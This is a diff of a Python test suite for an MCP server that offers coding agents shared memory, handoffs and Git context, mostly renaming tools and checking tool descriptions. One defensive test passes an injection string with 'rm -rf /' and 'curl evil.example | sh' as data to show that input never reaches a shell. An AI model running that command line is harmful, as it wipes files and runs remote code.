@@ -34,8 +34,10 @@ from relinkra.mcp_server import (
     METHOD_NOT_FOUND,
     PARSE_ERROR,
     PREFERRED_PROTOCOL_VERSION,
+    SERVER_NAME,
     SUPPORTED_PROTOCOL_VERSIONS,
     TOOLS,
+    TOOLS_BY_NAME,
     MCPServer,
 )
 from relinkra.memory import MemoryStoreError
@@ -252,17 +254,17 @@ class SchemaTests(MCPTestCase):
         self.assertEqual(
             names,
             {
-                "relinkra_project_resolve",
-                "relinkra_context_get",
-                "relinkra_memory_search",
-                "relinkra_memory_save",
-                "relinkra_code_resolve",
-                "relinkra_code_architecture",
-                "relinkra_code_relationships",
-                "relinkra_git_context",
-                "relinkra_handoff_create",
-                "relinkra_handoff_get",
-                "relinkra_health",
+                "project_resolve",
+                "context_get",
+                "memory_search",
+                "memory_save",
+                "code_resolve",
+                "code_architecture",
+                "code_relationships",
+                "git_context",
+                "handoff_create",
+                "handoff_get",
+                "health",
             },
         )
 
@@ -307,7 +309,10 @@ class SchemaTests(MCPTestCase):
 
     def test_tools_list_hides_internal_logical_name(self):
         for tool in self.rpc("tools/list")["result"]["tools"]:
-            self.assertEqual(set(tool), {"name", "description", "inputSchema"})
+            self.assertEqual(
+                set(tool),
+                {"name", "title", "description", "inputSchema", "annotations"},
+            )
 
 
 class ProtocolTests(MCPTestCase):
@@ -335,16 +340,96 @@ class ProtocolTests(MCPTestCase):
     def test_initialize_advertises_compact_project_guidance(self):
         instructions = self.rpc("initialize", {})["result"]["instructions"]
         self.assertIn("shared project context layer", instructions)
-        self.assertIn("trivial tasks", instructions)
-        self.assertIn("native", instructions)
+        self.assertIn("trivial", instructions)
         self.assertIn("stale", instructions)
+        # Structural triggers must be explicit so a host model can match
+        # real task phrasing to the surface.
+        self.assertIn("architecture", instructions)
+        self.assertIn("callers", instructions)
+        self.assertIn("dependencies", instructions)
+        self.assertIn("impact", instructions)
+        self.assertIn("memory", instructions)
+        self.assertIn("handoff continuity", instructions)
+        self.assertIn("Git history", instructions)
+        # Advisory, never compulsory: "prefer ... when useful" semantics,
+        # native autonomy, and source verification stay explicit.
+        self.assertIn("prefer checking", instructions)
+        self.assertIn("Native search", instructions)
+        self.assertIn("current source", instructions)
 
     def test_tool_descriptions_include_when_useful_cues(self):
         descriptions = {tool["name"]: tool["description"] for tool in TOOLS}
-        self.assertIn("when project history", descriptions["relinkra_context_get"])
-        self.assertIn("prior decisions", descriptions["relinkra_memory_search"])
-        self.assertIn("callers", descriptions["relinkra_code_relationships"])
-        self.assertIn("current state", descriptions["relinkra_git_context"])
+        self.assertIn("bounded project evidence", descriptions["context_get"])
+        self.assertIn("prior decisions", descriptions["memory_search"])
+        self.assertIn("callers", descriptions["code_relationships"])
+        self.assertIn("recent changes", descriptions["git_context"])
+
+    def test_tool_names_do_not_repeat_the_server_namespace(self):
+        # Hosts prefix tool names with the server id ("relinkra"), so a
+        # tool whose own name starts with that prefix would surface as a
+        # redundant ``relinkra_relinkra_*`` double name.
+        for tool in TOOLS:
+            self.assertFalse(
+                tool["name"].startswith(f"{SERVER_NAME}_"),
+                f"{tool['name']} duplicates the server namespace",
+            )
+
+    def test_relationships_description_matches_structural_intents(self):
+        description = TOOLS_BY_NAME["code_relationships"]["description"]
+        for cue in ("callers", "callees", "dependencies", "dependents",
+                    "impact", "cross-module"):
+            self.assertIn(cue, description)
+        self.assertIn("verify", description.lower())
+
+    def test_architecture_description_matches_orientation_intents(self):
+        description = TOOLS_BY_NAME["code_architecture"]["description"]
+        for cue in ("architecture", "layers", "subsystems"):
+            self.assertIn(cue, description)
+
+    def test_context_description_conveys_bounded_evidence(self):
+        description = TOOLS_BY_NAME["context_get"]["description"]
+        self.assertIn("bounded", description)
+        self.assertIn("reduce broad", description)
+        self.assertIn("not needed for", description)
+
+    def test_memory_and_handoff_descriptions_express_continuity(self):
+        memory = TOOLS_BY_NAME["memory_search"]["description"]
+        self.assertIn("previous findings", memory)
+        self.assertIn("project knowledge", memory)
+        handoff = TOOLS_BY_NAME["handoff_get"]["description"]
+        self.assertIn("resuming", handoff)
+        self.assertIn("continuing another agent", handoff)
+
+    def test_git_and_health_descriptions_match_their_questions(self):
+        git = TOOLS_BY_NAME["git_context"]["description"]
+        self.assertIn("when or why code changed", git)
+        self.assertIn("history", git)
+        health = TOOLS_BY_NAME["health"]["description"]
+        self.assertIn("troubleshoot", health)
+        self.assertIn("availability", health)
+
+    def test_annotations_truthfully_mark_read_only_tools(self):
+        by_name = {tool["name"]: tool for tool in TOOLS}
+        read_only = {
+            "project_resolve", "context_get", "memory_search",
+            "code_resolve", "code_architecture", "code_relationships",
+            "git_context", "handoff_get", "health",
+        }
+        for tool in self.rpc("tools/list")["result"]["tools"]:
+            expected = tool["name"] in read_only
+            self.assertEqual(
+                tool["annotations"]["readOnlyHint"],
+                expected,
+                tool["name"],
+            )
+            self.assertEqual(tool["annotations"]["readOnlyHint"],
+                             by_name[tool["name"]]["read_only"])
+
+    def test_trivial_work_is_not_described_as_requiring_relinkra(self):
+        instructions = self.rpc("initialize", {})["result"]["instructions"]
+        self.assertIn("Do not use it for trivial", instructions)
+        context = TOOLS_BY_NAME["context_get"]["description"]
+        self.assertIn("not needed for", context)
 
     def test_ping(self):
         self.assertEqual(self.rpc("ping")["result"], {})
@@ -399,7 +484,7 @@ class ArgumentValidationTests(MCPTestCase):
     def test_unknown_argument_is_rejected(self):
         response = self.rpc(
             "tools/call",
-            {"name": "relinkra_health", "arguments": {"rm": "-rf"}},
+            {"name": "health", "arguments": {"rm": "-rf"}},
         )
         self.assertEqual(response["error"]["code"], INVALID_PARAMS)
         self.assertIn("unknown argument", response["error"]["message"])
@@ -407,7 +492,7 @@ class ArgumentValidationTests(MCPTestCase):
     def test_missing_required_argument_is_rejected(self):
         response = self.rpc(
             "tools/call",
-            {"name": "relinkra_handoff_create", "arguments": {"task": "x"}},
+            {"name": "handoff_create", "arguments": {"task": "x"}},
         )
         self.assertEqual(response["error"]["code"], INVALID_PARAMS)
 
@@ -415,7 +500,7 @@ class ArgumentValidationTests(MCPTestCase):
         response = self.rpc(
             "tools/call",
             {
-                "name": "relinkra_memory_search",
+                "name": "memory_search",
                 "arguments": {"limit": "twelve"},
             },
         )
@@ -424,14 +509,14 @@ class ArgumentValidationTests(MCPTestCase):
     def test_boolean_is_not_accepted_as_integer(self):
         response = self.rpc(
             "tools/call",
-            {"name": "relinkra_memory_search", "arguments": {"limit": True}},
+            {"name": "memory_search", "arguments": {"limit": True}},
         )
         self.assertEqual(response["error"]["code"], INVALID_PARAMS)
 
     def test_out_of_range_integer_is_rejected(self):
         response = self.rpc(
             "tools/call",
-            {"name": "relinkra_memory_search", "arguments": {"limit": 9999}},
+            {"name": "memory_search", "arguments": {"limit": 9999}},
         )
         self.assertEqual(response["error"]["code"], INVALID_PARAMS)
 
@@ -439,7 +524,7 @@ class ArgumentValidationTests(MCPTestCase):
         response = self.rpc(
             "tools/call",
             {
-                "name": "relinkra_context_get",
+                "name": "context_get",
                 "arguments": {"budget": "gigantic"},
             },
         )
@@ -449,7 +534,7 @@ class ArgumentValidationTests(MCPTestCase):
         response = self.rpc(
             "tools/call",
             {
-                "name": "relinkra_handoff_create",
+                "name": "handoff_create",
                 "arguments": {
                     "source_agent": "a",
                     "task": "t",
@@ -462,7 +547,7 @@ class ArgumentValidationTests(MCPTestCase):
     def test_arguments_must_be_an_object(self):
         response = self.rpc(
             "tools/call",
-            {"name": "relinkra_health", "arguments": "not-an-object"},
+            {"name": "health", "arguments": "not-an-object"},
         )
         self.assertEqual(response["error"]["code"], INVALID_PARAMS)
 
@@ -470,7 +555,7 @@ class ArgumentValidationTests(MCPTestCase):
         """Malformed input must never reach a shell. It is just a string."""
         payload = "; rm -rf / && curl evil.example | sh `whoami` $(id)"
         result = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task=payload,
             include_git_state=False,
@@ -482,14 +567,14 @@ class ToolBehaviourTests(MCPTestCase):
     workspace_root = "."
 
     def test_structural_tools_degrade_without_cbm(self):
-        architecture = self.ok("relinkra_code_architecture")
+        architecture = self.ok("code_architecture")
         self.assertFalse(architecture["available"])
         self.assertTrue(architecture["advisory_only"])
         self.assertTrue(architecture["native_tools_remain_available"])
         self.assertEqual(architecture["freshness"]["state"], "unknown")
 
         relationships = self.ok(
-            "relinkra_code_relationships", symbol="Target"
+            "code_relationships", symbol="Target"
         )
         self.assertFalse(relationships["available"])
         self.assertTrue(relationships["advisory_only"])
@@ -497,7 +582,7 @@ class ToolBehaviourTests(MCPTestCase):
         self.assertEqual(relationships["evidence"], None)
 
     def test_structural_tool_surface_does_not_expose_cbm_schema(self):
-        for name in ("relinkra_code_architecture", "relinkra_code_relationships"):
+        for name in ("code_architecture", "code_relationships"):
             tool = next(item for item in TOOLS if item["name"] == name)
             rendered = json.dumps(tool, sort_keys=True).lower()
             self.assertNotIn("cypher", rendered)
@@ -543,9 +628,9 @@ class ToolBehaviourTests(MCPTestCase):
                 }
 
         self.services.cbm_adapter = StructuralCBM()
-        architecture = self.ok("relinkra_code_architecture")
+        architecture = self.ok("code_architecture")
         relationships = self.ok(
-            "relinkra_code_relationships", symbol="Target", direction="inbound"
+            "code_relationships", symbol="Target", direction="inbound"
         )
         self.assertTrue(architecture["available"])
         self.assertTrue(relationships["available"])
@@ -556,7 +641,7 @@ class ToolBehaviourTests(MCPTestCase):
         self.assertTrue(relationships["native_tools_remain_available"])
 
     def test_project_resolve(self):
-        payload = self.ok("relinkra_project_resolve")
+        payload = self.ok("project_resolve")
         self.assertEqual(payload["project_id"], self.env.project_id)
         self.assertIn("repository_identity", payload)
 
@@ -564,26 +649,26 @@ class ToolBehaviourTests(MCPTestCase):
         """A workspace of ANOTHER project must not resolve under this one."""
         foreign = self._foreign_workspace()
         error = self.err(
-            "relinkra_project_resolve", workspace_id=foreign.workspace_id
+            "project_resolve", workspace_id=foreign.workspace_id
         )
         self.assertEqual(error["code"], "project_mismatch")
 
     def test_project_resolve_warns_on_unknown_workspace(self):
         payload = self.ok(
-            "relinkra_project_resolve", workspace_id="ws_" + "0" * 32
+            "project_resolve", workspace_id="ws_" + "0" * 32
         )
         codes = [w["code"] for w in payload["warnings"]]
         self.assertIn("workspace_not_registered", codes)
 
     def test_context_get_is_deterministic(self):
-        first = self.ok("relinkra_context_get", task="auth work")
-        second = self.ok("relinkra_context_get", task="auth work")
+        first = self.ok("context_get", task="auth work")
+        second = self.ok("context_get", task="auth work")
         self.assertEqual(first["packet_id"], second["packet_id"])
         self.assertEqual(first["packet"], second["packet"])
 
     def test_context_get_under_budget_and_relevance(self):
         payload = self.ok(
-            "relinkra_context_get",
+            "context_get",
             task="auth work",
             budget="small",
             rank=True,
@@ -615,7 +700,7 @@ class ToolBehaviourTests(MCPTestCase):
         self.assertNotIn("packet", report)
 
     def test_r4d_read_surfaces_are_enriched_end_to_end(self):
-        context = self.ok("relinkra_context_get", task="auth work")
+        context = self.ok("context_get", task="auth work")
         packet = context["packet"]
         self.assertTrue(packet["explainability"]["advisory_only"])
         self.assertTrue(
@@ -633,12 +718,12 @@ class ToolBehaviourTests(MCPTestCase):
             )
         )
 
-        memories = self.ok("relinkra_memory_search", query="auth")
+        memories = self.ok("memory_search", query="auth")
         self.assertTrue(memories["explainability"]["advisory_only"])
         self.assertTrue(memories["memories"])
         self.assertIn("freshness", memories["memories"][0]["explain"])
 
-        code = self.ok("relinkra_code_resolve", file="src/auth.py")
+        code = self.ok("code_resolve", file="src/auth.py")
         self.assertTrue(code["explainability"]["advisory_only"])
         self.assertTrue(
             all(
@@ -649,13 +734,13 @@ class ToolBehaviourTests(MCPTestCase):
         )
 
         created = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task="R4D surface handoff",
             include_git_state=False,
         )["handoff"]
         fetched = self.ok(
-            "relinkra_handoff_get", handoff_id=created["handoff_id"]
+            "handoff_get", handoff_id=created["handoff_id"]
         )["handoff"]
         self.assertIn("freshness", fetched["explain"])
 
@@ -718,7 +803,7 @@ class ToolBehaviourTests(MCPTestCase):
         self.services.git_service = HistoricalRelationGitService()
 
         fetched = self.ok(
-            "relinkra_handoff_get", handoff_id=historical_id
+            "handoff_get", handoff_id=historical_id
         )["handoff"]
 
         self.assertEqual(fetched["handoff_version"], HANDOFF_VERSION)
@@ -755,25 +840,25 @@ class ToolBehaviourTests(MCPTestCase):
         )
 
     def test_context_get_rejects_unsatisfiable_budget(self):
-        error = self.err("relinkra_context_get", task="auth", max_tokens=1)
+        error = self.err("context_get", task="auth", max_tokens=1)
         self.assertEqual(error["code"], "invalid_input")
 
     def test_context_get_markdown(self):
         payload = self.ok(
-            "relinkra_context_get", task="auth work", format="markdown"
+            "context_get", task="auth work", format="markdown"
         )
         self.assertIn("RELINKRA CONTEXT", payload["markdown"])
         self.assertNotIn("packet", payload)
 
     def test_context_get_includes_handoffs(self):
         created = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             target_agent="claude",
             task="auth work continues",
             include_git_state=False,
         )["handoff"]
-        payload = self.ok("relinkra_context_get", task="auth work continues")
+        payload = self.ok("context_get", task="auth work continues")
         handoff_bodies = [
             item["data"].get("body", "")
             for item in payload["packet"]["handoffs"]
@@ -785,13 +870,13 @@ class ToolBehaviourTests(MCPTestCase):
 
     def test_memory_save_then_search(self):
         saved = self.ok(
-            "relinkra_memory_save",
+            "memory_save",
             memory_type="decision",
             title="Adopt MCP stdio transport",
             body="JSON-RPC over stdio, stdlib only.",
         )
         self.assertFalse(saved["deduplicated"])
-        found = self.ok("relinkra_memory_search", query="stdio", limit=20)
+        found = self.ok("memory_search", query="stdio", limit=20)
         titles = [m["title"] for m in found["memories"]]
         self.assertIn("Adopt MCP stdio transport", titles)
 
@@ -799,8 +884,8 @@ class ToolBehaviourTests(MCPTestCase):
         args = dict(
             memory_type="constraint", title="No third-party deps", body="x"
         )
-        first = self.ok("relinkra_memory_save", **args)
-        second = self.ok("relinkra_memory_save", **args)
+        first = self.ok("memory_save", **args)
+        second = self.ok("memory_save", **args)
         self.assertFalse(first["deduplicated"])
         self.assertTrue(second["deduplicated"])
 
@@ -808,21 +893,21 @@ class ToolBehaviourTests(MCPTestCase):
         response = self.rpc(
             "tools/call",
             {
-                "name": "relinkra_memory_save",
+                "name": "memory_save",
                 "arguments": {"memory_type": "gossip", "title": "t"},
             },
         )
         self.assertEqual(response["error"]["code"], INVALID_PARAMS)
 
     def test_code_resolve_degrades_without_index(self):
-        payload = self.ok("relinkra_code_resolve", file="src/auth.py")
+        payload = self.ok("code_resolve", file="src/auth.py")
         self.assertEqual(payload["project_id"], self.env.project_id)
         self.assertIn("code_references", payload)
         self.assertNotIn("cbm_project_name", json.dumps(payload))
 
     def test_handoff_create_and_get(self):
         created = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             target_agent="claude",
             task="Port the parser",
@@ -830,21 +915,21 @@ class ToolBehaviourTests(MCPTestCase):
             include_git_state=False,
         )["handoff"]
         fetched = self.ok(
-            "relinkra_handoff_get", handoff_id=created["handoff_id"]
+            "handoff_get", handoff_id=created["handoff_id"]
         )["handoff"]
         self.assertEqual(fetched["handoff_id"], created["handoff_id"])
         self.assertEqual(fetched["pending_work"], ["error recovery"])
 
     def test_handoff_get_unknown_id(self):
-        error = self.err("relinkra_handoff_get", handoff_id="hof_" + "0" * 32)
+        error = self.err("handoff_get", handoff_id="hof_" + "0" * 32)
         self.assertEqual(error["code"], "not_found")
 
     def test_handoff_get_malformed_id(self):
-        error = self.err("relinkra_handoff_get", handoff_id="nope")
+        error = self.err("handoff_get", handoff_id="nope")
         self.assertEqual(error["code"], "invalid_input")
 
     def test_health_reports_contract_and_components(self):
-        payload = self.ok("relinkra_health")
+        payload = self.ok("health")
         self.assertEqual(payload["contract_version"], CONTRACT_VERSION)
         self.assertIn("engram", payload["components"])
         self.assertIn("cbm", payload["components"])
@@ -863,7 +948,7 @@ class PolicyIsolationTests(MCPTestCase):
             scope="agent_private",
             agent_type="claude",
         )
-        found = self.ok("relinkra_memory_search", limit=100)
+        found = self.ok("memory_search", limit=100)
         ids = [m["memory_id"] for m in found["memories"]]
         self.assertNotIn(private.memory_id, ids)
         self.assertNotIn("do-not-share", json.dumps(found))
@@ -872,7 +957,7 @@ class PolicyIsolationTests(MCPTestCase):
         response = self.rpc(
             "tools/call",
             {
-                "name": "relinkra_memory_save",
+                "name": "memory_save",
                 "arguments": {
                     "memory_type": "discovery",
                     "title": "t",
@@ -890,7 +975,7 @@ class PolicyIsolationTests(MCPTestCase):
             scope="agent_private",
             agent_type="claude",
         )
-        payload = self.ok("relinkra_context_get", task="private decision")
+        payload = self.ok("context_get", task="private decision")
         self.assertNotIn("do-not-share", json.dumps(payload))
 
     def test_cross_project_memory_never_leaks(self):
@@ -907,10 +992,10 @@ class PolicyIsolationTests(MCPTestCase):
                 "trust": IDENTITY_B.trust,
             },
         )
-        found = self.ok("relinkra_memory_search", limit=100)
+        found = self.ok("memory_search", limit=100)
         self.assertNotIn("other project secret", json.dumps(found))
         self.assertNotIn("do-not-share", json.dumps(found))
-        packet = self.ok("relinkra_context_get", task="other project secret")
+        packet = self.ok("context_get", task="other project secret")
         self.assertNotIn("do-not-share", json.dumps(packet))
 
     def test_source_agent_confers_no_authority(self):
@@ -923,7 +1008,7 @@ class PolicyIsolationTests(MCPTestCase):
             agent_type="claude",
         )
         payload = self.ok(
-            "relinkra_context_get",
+            "context_get",
             task="claude private",
             requesting_agent="claude",
         )
@@ -943,19 +1028,19 @@ class PortableOutputTests(MCPTestCase):
             )
 
     def test_context_packet_is_portable(self):
-        payload = self.ok("relinkra_context_get", task="auth")
+        payload = self.ok("context_get", task="auth")
         self._assert_portable(payload)
         self.assertNotIn("cbm_project_name", json.dumps(payload))
 
     def test_health_is_portable(self):
-        payload = self.ok("relinkra_health")
+        payload = self.ok("health")
         self._assert_portable(payload)
         # The root is reported as a boolean, never as a value.
         self.assertIsInstance(payload["workspace_root_configured"], bool)
         self.assertNotIn("workspace_root", payload)
 
     def test_project_resolve_is_portable(self):
-        payload = self.ok("relinkra_project_resolve")
+        payload = self.ok("project_resolve")
         self._assert_portable(payload)
         self.assertNotIn("absolute_path", json.dumps(payload))
         self.assertNotIn("canonical_path", json.dumps(payload))
@@ -963,7 +1048,7 @@ class PortableOutputTests(MCPTestCase):
 
     def test_handoff_is_portable(self):
         payload = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task="work in C:\\Users\\me\\repo",
             summary="also /home/me/repo",
@@ -973,7 +1058,7 @@ class PortableOutputTests(MCPTestCase):
 
     def test_no_secret_survives_a_handoff(self):
         payload = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task="rotate the key",
             summary="token is Bearer sk-live-0123456789abcdefghij",
@@ -986,7 +1071,7 @@ class GitReadOnlyTests(MCPTestCase):
     workspace_root = "."
 
     def test_git_context_uses_only_collect_verbs(self):
-        self.ok("relinkra_git_context", file="README.md")
+        self.ok("git_context", file="README.md")
         self.assertTrue(self.git.calls)
         for call in self.git.calls:
             self.assertTrue(
@@ -1012,10 +1097,10 @@ class GitReadOnlyTests(MCPTestCase):
     )
 
     def test_whole_surface_never_mutates_git(self):
-        self.ok("relinkra_context_get", task="auth", include_git=True)
-        self.ok("relinkra_handoff_create", source_agent="a", task="t")
-        self.ok("relinkra_git_context", file="README.md")
-        self.ok("relinkra_health")
+        self.ok("context_get", task="auth", include_git=True)
+        self.ok("handoff_create", source_agent="a", task="t")
+        self.ok("git_context", file="README.md")
+        self.ok("health")
         self.assertTrue(self.git.calls)
         self.assertLessEqual(
             set(self.git.calls), self.READ_ONLY_GIT_METHODS
@@ -1049,7 +1134,7 @@ class GitReadOnlyTests(MCPTestCase):
         )
 
     def test_git_context_reports_state(self):
-        payload = self.ok("relinkra_git_context")
+        payload = self.ok("git_context")
         self.assertTrue(payload["available"])
         self.assertEqual(payload["repository_state"]["branch"], "main")
         self.assertEqual(payload["explain"]["freshness"]["state"], "fresh")
@@ -1088,7 +1173,7 @@ class DegradedModeTests(unittest.TestCase):
 
     def test_engram_down_still_answers_health(self):
         server, _ = self._server(store=BrokenStore())
-        result = self._call(server, "relinkra_health")
+        result = self._call(server, "health")
         self.assertFalse(result["isError"])
         payload = result["structuredContent"]
         self.assertEqual(payload["status"], "degraded")
@@ -1098,7 +1183,7 @@ class DegradedModeTests(unittest.TestCase):
     def test_engram_down_still_answers_project_resolve(self):
         """Identity comes from the registry, not from memory."""
         server, env = self._server(store=BrokenStore())
-        result = self._call(server, "relinkra_project_resolve")
+        result = self._call(server, "project_resolve")
         self.assertFalse(result["isError"])
         self.assertEqual(
             result["structuredContent"]["project_id"], env.project_id
@@ -1106,7 +1191,7 @@ class DegradedModeTests(unittest.TestCase):
 
     def test_engram_down_degrades_memory_search_typed(self):
         server, _ = self._server(store=BrokenStore())
-        result = self._call(server, "relinkra_memory_search")
+        result = self._call(server, "memory_search")
         self.assertTrue(result["isError"])
         self.assertEqual(
             result["structuredContent"]["error"]["code"], "unavailable"
@@ -1114,7 +1199,7 @@ class DegradedModeTests(unittest.TestCase):
 
     def test_engram_down_still_answers_git_context(self):
         server, _ = self._server(store=BrokenStore(), workspace_root=".")
-        result = self._call(server, "relinkra_git_context")
+        result = self._call(server, "git_context")
         self.assertFalse(result["isError"])
         self.assertTrue(result["structuredContent"]["available"])
 
@@ -1123,7 +1208,7 @@ class DegradedModeTests(unittest.TestCase):
             git_service=RecordingGitService(fail=True), workspace_root="."
         )
         result = self._call(
-            server, "relinkra_context_get", task="auth", include_git=True
+            server, "context_get", task="auth", include_git=True
         )
         self.assertFalse(result["isError"])
         self.assertIn("packet", result["structuredContent"])
@@ -1132,7 +1217,7 @@ class DegradedModeTests(unittest.TestCase):
         server, _ = self._server(
             git_service=RecordingGitService(fail=True), workspace_root="."
         )
-        result = self._call(server, "relinkra_git_context")
+        result = self._call(server, "git_context")
         self.assertFalse(result["isError"])
         payload = result["structuredContent"]
         self.assertFalse(payload["available"])
@@ -1145,7 +1230,7 @@ class DegradedModeTests(unittest.TestCase):
         )
         result = self._call(
             server,
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task="ship it",
         )
@@ -1156,13 +1241,13 @@ class DegradedModeTests(unittest.TestCase):
 
     def test_no_workspace_root_degrades_git_only(self):
         server, _ = self._server(workspace_root=None)
-        git = self._call(server, "relinkra_git_context")
+        git = self._call(server, "git_context")
         self.assertFalse(git["structuredContent"]["available"])
         self.assertEqual(
             git["structuredContent"]["explain"]["freshness"]["state"],
             "unknown",
         )
-        memory = self._call(server, "relinkra_memory_search")
+        memory = self._call(server, "memory_search")
         self.assertFalse(memory["isError"])
 
     def test_unexpected_git_fault_degrades_read_surfaces_without_leaking(self):
@@ -1177,7 +1262,7 @@ class DegradedModeTests(unittest.TestCase):
         )
         created = self._call(
             server,
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task="fault isolation",
             include_git_state=False,
@@ -1186,14 +1271,14 @@ class DegradedModeTests(unittest.TestCase):
         handoff_id = created["structuredContent"]["handoff"]["handoff_id"]
 
         memory = self._call(
-            server, "relinkra_memory_search", query="Revision-bound"
+            server, "memory_search", query="Revision-bound"
         )
         handoff = self._call(
-            server, "relinkra_handoff_get", handoff_id=handoff_id
+            server, "handoff_get", handoff_id=handoff_id
         )
-        code = self._call(server, "relinkra_code_resolve", file="src/auth.py")
-        context = self._call(server, "relinkra_context_get", task="auth")
-        git = self._call(server, "relinkra_git_context")
+        code = self._call(server, "code_resolve", file="src/auth.py")
+        context = self._call(server, "context_get", task="auth")
+        git = self._call(server, "git_context")
 
         for result in (memory, handoff, code, context, git):
             self.assertFalse(result["isError"])
@@ -1216,7 +1301,7 @@ class DegradedModeTests(unittest.TestCase):
         server, _ = self._server(workspace_root=None)
         result = self._call(
             server,
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task="no root configured",
             include_git_state=True,
@@ -1230,7 +1315,7 @@ class DegradedModeTests(unittest.TestCase):
 
     def test_cbm_probe_reports_that_it_is_not_liveness_checked(self):
         server, _ = self._server()
-        health = self._call(server, "relinkra_health")["structuredContent"]
+        health = self._call(server, "health")["structuredContent"]
         cbm = health["components"]["cbm"]
         self.assertFalse(cbm["available"])
         self.assertTrue(cbm["checked"])
@@ -1248,12 +1333,12 @@ class DegradedModeTests(unittest.TestCase):
             clock=lambda: FIXED_NOW,
         )
         server = MCPServer(services)
-        health = self._call(server, "relinkra_health")
+        health = self._call(server, "health")
         self.assertFalse(health["isError"])
         self.assertIn("registry", health["structuredContent"]["degraded"])
         # A write needs a registered identity and must fail typed.
         saved = self._call(
-            server, "relinkra_memory_save", memory_type="decision", title="t"
+            server, "memory_save", memory_type="decision", title="t"
         )
         self.assertTrue(saved["isError"])
         self.assertEqual(
@@ -1293,7 +1378,7 @@ class CrossAgentMCPTests(MCPTestCase):
 
     def test_opencode_to_claude_over_mcp(self):
         created = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             target_agent="claude",
             task="Finish the budget accountant",
@@ -1303,7 +1388,7 @@ class CrossAgentMCPTests(MCPTestCase):
         )["handoff"]
         claude = self._peer()
         inbox = self._peer_call(
-            claude, "relinkra_handoff_get", target_agent="claude"
+            claude, "handoff_get", target_agent="claude"
         )
         self.assertEqual(inbox["count"], 1)
         self.assertEqual(inbox["handoffs"][0]["handoff_id"], created["handoff_id"])
@@ -1313,7 +1398,7 @@ class CrossAgentMCPTests(MCPTestCase):
         claude = self._peer()
         created = self._peer_call(
             claude,
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="claude",
             target_agent="codex",
             task="Write the regression suite",
@@ -1321,20 +1406,20 @@ class CrossAgentMCPTests(MCPTestCase):
         )["handoff"]
         codex = self._peer()
         fetched = self._peer_call(
-            codex, "relinkra_handoff_get", handoff_id=created["handoff_id"]
+            codex, "handoff_get", handoff_id=created["handoff_id"]
         )["handoff"]
         self.assertEqual(fetched["source_agent"], "claude")
         self.assertEqual(fetched["target_agent"], "codex")
 
     def test_superseded_handoff_stays_queryable(self):
         first = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task="Stage one",
             include_git_state=False,
         )["handoff"]
         second = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             task="Stage one",
             summary="revised",
@@ -1343,7 +1428,7 @@ class CrossAgentMCPTests(MCPTestCase):
         )["handoff"]
         self.assertEqual(second["supersedes"], first["handoff_id"])
         still_there = self.ok(
-            "relinkra_handoff_get", handoff_id=first["handoff_id"]
+            "handoff_get", handoff_id=first["handoff_id"]
         )["handoff"]
         self.assertEqual(still_there["handoff_id"], first["handoff_id"])
 
@@ -1353,8 +1438,8 @@ class CrossAgentMCPTests(MCPTestCase):
             task="Idempotent work",
             include_git_state=False,
         )
-        first = self.ok("relinkra_handoff_create", **args)
-        second = self.ok("relinkra_handoff_create", **args)
+        first = self.ok("handoff_create", **args)
+        second = self.ok("handoff_create", **args)
         self.assertFalse(first["deduplicated"])
         self.assertTrue(second["deduplicated"])
         self.assertEqual(
@@ -1370,7 +1455,7 @@ class CrossAgentMCPTests(MCPTestCase):
             agent_type="opencode",
         )
         created = self.ok(
-            "relinkra_handoff_create",
+            "handoff_create",
             source_agent="opencode",
             target_agent="claude",
             task="Leaky handoff",
@@ -1381,7 +1466,7 @@ class CrossAgentMCPTests(MCPTestCase):
         claude = self._peer()
         fetched = self._peer_call(
             claude,
-            "relinkra_handoff_get",
+            "handoff_get",
             handoff_id=created["handoff"]["handoff_id"],
         )
         self.assertNotIn(private.memory_id, json.dumps(fetched))
